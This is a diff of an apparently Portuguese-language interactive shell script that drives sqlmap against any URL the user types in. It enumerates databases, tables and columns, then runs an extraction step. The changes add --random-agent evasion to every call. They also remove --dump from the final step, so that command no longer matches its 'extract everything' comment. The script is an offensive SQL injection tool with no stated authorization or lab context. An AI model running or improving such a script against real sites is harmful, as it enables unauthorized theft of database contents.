@@ -60,28 +60,28 @@ echo "\033[1;36m\n[+]=> DIGITE OU COLE A URL PARA O SQLMAP\033[1;31m"
 read -p "[+]=> " url
 #
 #Começa a listar as databases
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs --random-agent
 #
 #Read para digitar o nome da database listada
 echo "\033[1;36m[+]=> DIGITE O NOME DA DATABASE\033[1;31m"
 read -p "[+]=> " db
 #
 #Começa a listar as tabelas
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables --random-agent 
 #
 #Read para digitar o nome da tabela
 echo "\033[1;36m[+]=> DIGITE O NOME DA TABELA\033[1;31m"
 read -p "[+]=> " tabela
 #
 #Começa a listar as colunas
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns --random-agent 
 #
 #Read para digitar o nome da coluna
 echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
 read -p "[+]=> " coluna
 #
 #Extrai todo o trabalho feito
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna 
 fi
 if [ "$opcao" = "3" ];then
 clear
